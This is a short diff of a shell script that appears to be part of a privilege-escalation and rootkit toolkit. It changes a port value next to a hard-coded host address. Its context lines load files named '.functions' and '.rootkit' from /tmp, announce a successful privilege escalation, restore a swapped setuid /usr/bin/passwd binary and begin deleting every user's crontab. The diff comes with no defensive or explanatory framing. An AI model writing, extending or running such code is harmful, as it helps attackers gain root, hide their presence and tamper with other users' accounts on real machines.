@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15828"
+portp="15435"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -25,7 +25,7 @@ echo "priviledge escalation succeeded"
 #restore /usr/bin/passwd
 mv /tmp/bak /usr/bin/passwd &>/dev/null
 chown root:root /usr/bin/passwd &>/dev/null
-chmod u+s /usr/bin/passwd
+chmod u+s /usr/bin/passwd &>/dev/null
 
 #remove user's crontab
 users=$(cat /etc/passwd | awk -F: '{ print $1 }')
